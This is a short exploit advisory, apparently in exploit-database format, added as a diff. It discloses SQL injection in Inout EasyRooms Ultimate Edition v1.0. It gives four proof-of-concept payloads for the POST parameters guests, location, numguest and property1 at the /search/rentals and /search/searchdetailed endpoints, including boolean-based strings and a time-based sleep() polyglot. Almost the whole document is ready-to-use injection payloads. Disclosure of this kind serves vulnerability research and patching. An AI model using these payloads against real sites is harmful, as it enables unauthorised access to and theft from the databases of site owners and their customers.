@@ -1,0 +1,34 @@
+# Exploit Title: Inout EasyRooms Ultimate Edition - SQL Injection
+# Date: 29.03.2019
+# Exploit Author: Ahmet Ümit BAYRAM
+# Vendor Homepage: https://www.inoutscripts.com/products/inout-easyrooms/
+# Demo Site: http://inout-easyrooms.demo.inoutscripts.net/
+# Version: v1.0
+# Tested on: Kali Linux
+# CVE: N/A
+
+----- PoC 1: SQLi -----
+
+Request: http://localhost/[PATH]/search/rentals
+Vulnerable Parameter: guests (POST)
+Payload: guests=-1' OR 3*2*1=6 AND 00046=00046 --
+
+----- PoC 2: SQLi -----
+
+Request: http://localhost/[PATH]/search/searchdetailed
+Vulnerable Parameter: location (POST)
+Payload:  location=-1' OR 3*2*1=6 AND 000603=000603 or 'UeNQc30f'='
+
+----- PoC 3: SQLi -----
+
+Request: http://localhost/[PATH]/search/searchdetailed
+Vulnerable Parameter: numguest (POST)
+Payload:  numguest=-1' OR 3*2*1=6 AND 000232=000232 --
+
+
+----- PoC 4: SQLi -----
+
+Request: http://localhost/[PATH]/search/searchdetailed
+Vulnerable Parameter: property1 (POST)
+Payload:
+property1=(select(0)from(select(sleep(0)))v)/*'+(select(0)from(select(sleep(0)))v)+'"+(select(0)from(select(sleep(0)))v)+"*/
